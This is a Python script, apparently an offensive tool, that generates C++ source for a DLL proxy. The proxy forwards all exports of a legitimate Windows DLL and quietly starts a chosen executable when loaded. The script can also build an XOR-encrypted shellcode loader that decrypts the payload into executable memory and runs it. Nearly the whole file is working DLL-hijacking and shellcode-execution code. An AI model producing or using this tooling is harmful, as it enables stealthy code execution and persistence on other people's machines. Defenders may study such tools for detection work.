import sys
import os
import pefile
import argparse
from Crypto.Hash import MD5
from Crypto.Cipher import AES
from base64 import b64encode
from string import Template

createLoader = False
createProxy = True
ErrorSign = "\033[33m[!]\033[0m"
Success = "\033[32m[+]\033[0m"
Status = "\033[94m[*]\033[0m"

usage = f"""

Usage: \033[0mDllProxyGenerator.py <dll_path> <output_exe_path> [<shellcode_path> <xor_key>] <cpp_script_path>\033[0m

/-----------------------------------------------------------------------------------------\\
----------------------------{Success}-dll-Proxy-Creation--------------------------------
\\-----------------------------------------------------------------------------------------/

<dll_path>\033[0m path to the original DLL to proxy \033[94m(e.g., "C:\Windows\System32\kernel32.dll")\033[0m

<output_exe_path>\033[0m \033[31mABSOLUTE\033[0m final path where you will store your executable Application \033[94m(e.g., C:\path\\to\ShellCodeLoader.exe)\033[0m

/------------------------------------------------------------------------------------------\\
----------------------------{Success}-ShellCodeLoader-Creation--------------------------
\\------------------------------------------------------------------------------------------/

<shellcode_path> \033[0mpath to the shellcode binary file \033[94m(e.g., ".\shellcode.bin")\033[0m

<xor_key> \033[0mkey for XOR encryption of the shellcode \033[94m(e.g., "mysecretkey")\033[0m

/-----------------------------------------------------------------------------------------\\
----------------------------{ErrorSign}-Neccessary-Output-Path-------------------------------------
\\-----------------------------------------------------------------------------------------/

<cpp_script_path>\033[0m path to save the C++ script \033[94m(e.g., ".\output.cpp")\033[0m
\033[0m
"""

dllPath = sys.argv[1] if len(sys.argv) > 1 else sys.exit(usage)
exepath = sys.argv[2] if len(sys.argv) > 2 else sys.exit(usage)

if len(sys.argv) > 5:
    createLoader = True
    shellcodepath = sys.argv[3]
    masterKey = sys.argv[4]

    cppScriptPath = sys.argv[5]
else:
    cppScriptPath = sys.argv[3] if len(sys.argv) > 3 else sys.exit(usage)
    if len(sys.argv) > 4: sys.exit(usage)

loaderName = "ShellCodeLoader - COMPILE TO EXE.cpp"
finalProxyName = f'{ os.path.basename(cppScriptPath.strip(".dll"))} - COMPILE TO DLL.cpp'

if dllPath == "null" and exepath == "null":
    createProxy = False


def xor(data, key):
    l = len(key)
    keyAsInt = list(map(ord, key))
    return bytes(bytearray(
        (data[i] ^ keyAsInt[i % l] for i in range(0, len(data)))
    ))


# data as a bytearray 
def formatCPP(data, key, cipherType):
    shellcode = "\\x"
    shellcode += "\\x".join(format(b, '02x') for b in data)

    chunk_size = 16 * 4  # 16 bytes each line * 4 chars/byte (including \x)

    lines = [shellcode[i:i + chunk_size] for i in range(0, len(shellcode), chunk_size)]
    shellcode = "unsigned char enc[] =\n"
    shellcode += "\"" + "\"\n\"".join(lines) + "\";"
    return shellcode

shellCodeLoader = """
#include <windows.h>
#include <iostream>

// Define a function pointer type for the function you want to call
// For example, a function that returns int and takes no parameters
typedef int(__stdcall* FuncType)();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
    SHELLCODE_PLACEHOLDER
    size_t len = sizeof(enc);
    KEY
    size_t key_len = sizeof(key) - 1;

    // Allocate executable memory
    void* exec = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec) {
        return 1;
    }

    // Decrypt in-place using XOR key
    for (size_t i = 0; i < len; i++)
        ((unsigned char*)exec)[i] = enc[i] ^ key[i % key_len];

    // Make the memory executable
    DWORD oldProtect;
    if (!VirtualProtect(exec, len, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(exec, 0, MEM_RELEASE);
        return 1;
    }

    // Call the decoded stub; it will NOP and immediately return
    ((void(*)())exec)();

    VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}
"""

cppScript = """
#include "pch.h"
#include <stdio.h>
#include <stdlib.h>
#include <fstream>
#include <windows.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

PRAGMA_COMMENTS

HMODULE hReal = nullptr;

// richtige Signatur: WINAPI (entspricht LPTHREAD_START_ROUTINE)
DWORD WINAPI StartProcess(LPVOID lpParameter)
{
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // Vollständiger Pfad zur EXE
    LPCWSTR exePath = L"PATH_TO_EXE";

    BOOL ok = CreateProcessW(
        exePath,        // lpApplicationName (sicher, wenn voller Pfad)
        nullptr,        // lpCommandLine (NULL -> kein args)
        nullptr,
        nullptr,
        FALSE,
        0,
        nullptr,
        nullptr,
        &si,
        &pi
    );

    if (!ok) {
        DWORD err = GetLastError();
        wprintf(L"CreateProcessW failed: %lu\n", err);
        return err;
    }

    // optional: warten, wenn gewünscht
    // WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    if (!hReal) {
        hReal = LoadLibraryExW(L"DLLBASENAME", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
    }
    if (hReal) {
        using DllMainFn = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
        DllMainFn orig = (DllMainFn)GetProcAddress(hReal, "DllMain");
        if (!orig) {
            orig = (DllMainFn)GetProcAddress(hReal, (LPCSTR)MAKEINTRESOURCEA(180));
        }
        if (orig) {
            orig(hModule, ul_reason_for_call, lpReserved);
        }
    }

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        // sicherer: QueueUserWorkItem verwenden (weniger riskant in DllMain)
        // StartProcess hat kompatible Signatur (LPTHREAD_START_ROUTINE)
        if (!QueueUserWorkItem(StartProcess, nullptr, WT_EXECUTEDEFAULT)) {
            // Fallback: nichts tun oder Fehlerloggen
            wprintf(L"QueueUserWorkItem failed: %lu\n", GetLastError());
        }
        break;
    }

    case DLL_THREAD_ATTACH:
        break;

    case DLL_THREAD_DETACH:
        break;

    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
"""


#======================================================================================================
# MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':
    #------------------------------------------------------------------------
    # Open shellcode file and read all bytes from it
    if createLoader:
        try:
            with open(shellcodepath, "rb") as shellcodeFileHandle:
                shellcodeBytes = bytearray.fromhex(shellcodeFileHandle.read().decode('utf-8').strip("\n").replace('"', '').replace("\\x", " "))
                print("")
                print(f"{Status} Shellcode file [{shellcodepath}] successfully loaded.")

        except IOError:
            print(ErrorSign," Could not open or read file [{}]".format(shellcodepath))
            quit()

        #------------------------------------------------------------------------
        # Perform XOR transformation
        transformedShellcode = xor(shellcodeBytes, masterKey)
        cipherType = 'xor'

    print("\n\033[32m==================================== RESULT ====================================\033[0m\n")
    if createLoader:
        print(f"{Status} Encrypted shellcode size: [{len(transformedShellcode)}] bytes")
        shellcode = formatCPP(transformedShellcode, masterKey, cipherType)
    print("")

    if createProxy:
        # Load the PE file
        dllPeHeaders = pefile.PE(dllPath)

        # Build linker redirect pragmas equivalent (corrected)
        pragmaBuilder = ""
        IMAGE_SCN_MEM_EXECUTE = 0x20000000

        for sym in dllPeHeaders.DIRECTORY_ENTRY_EXPORT.symbols:
            # Skip forwarders
            if sym.forwarder is not None:
                continue
            name = sym.name.decode() if sym.name else None
            ord  = sym.ordinal
            rva  = sym.address  # already an RVA for non-forwarded exports
            section = dllPeHeaders.get_section_by_rva(rva)
            is_data = section is not None and not (section.Characteristics & IMAGE_SCN_MEM_EXECUTE)
            if name and name.startswith("Global_WindowsStorage_"):
                is_data = True
            if name:
                if is_data:
                    sys.exit(f"{ErrorSign} Target-Dll exports data.\n{ErrorSign}Please provide a DLL that only exports functions (no data exports)!\n{ErrorSign}Offending export: {name} (ordinal {ord})")
                else:
                    pragmaBuilder += f'#pragma comment(linker, "/export:{name}={os.path.basename(dllPath)}.{name},@{ord}")\n'
                    print(f"{Success} Exported Funktion {name} (ordinal {ord}).")
            else:
                # unnamed ordinal
                if is_data:
                    sys.exit(f"{ErrorSign} Target-Dll exports data.\n{ErrorSign}Please provide a DLL that only exports functions (no data exports)!\n{ErrorSign}Offending export: NONAME (ordinal {ord})")
                else:
                    pragmaBuilder += f'#pragma comment(linker, "/export:ord{ord}={os.path.basename(dllPath)}.#{ord},@{ord},NONAME")\n'
                    print(f"{Success} Exported Noname Funktion (ordinal {ord}).")

        print(f"{Status} Forwarded {len(dllPeHeaders.DIRECTORY_ENTRY_EXPORT.symbols)} function calls from {finalProxyName} to {os.path.basename(dllPath)}")

        dllTemplate = cppScript.replace("PRAGMA_COMMENTS", pragmaBuilder)

        dllTemplate = dllTemplate.replace("DLLBASENAME", os.path.basename(dllPath))

        dllTemplate = dllTemplate.replace("PATH_TO_EXE", exepath.replace("\\", "\\\\"))

    if createLoader:
        shellCodeLoader = shellCodeLoader.replace("SHELLCODE_PLACEHOLDER", shellcode)
        shellCodeLoader = shellCodeLoader.replace("KEY", f'char key[] = "{masterKey}";')

    if createProxy:
        loaderName = f'{ os.path.basename(exepath.strip(".dll"))} - COMPILE TO EXE.cpp'
        with open(os.path.join(os.path.dirname(cppScriptPath), finalProxyName), "w", encoding="utf-8") as f:
            f.write(dllTemplate)
        print(f"{Status} C++ proxy script written to {os.path.abspath(finalProxyName)}")
    
    if createLoader:
        with open(os.path.join(os.path.dirname(cppScriptPath), loaderName), "w", encoding="utf-8") as f:
            f.write(shellCodeLoader)
        print(f"{Status} C++ proxy script written to {os.path.abspath(loaderName)}")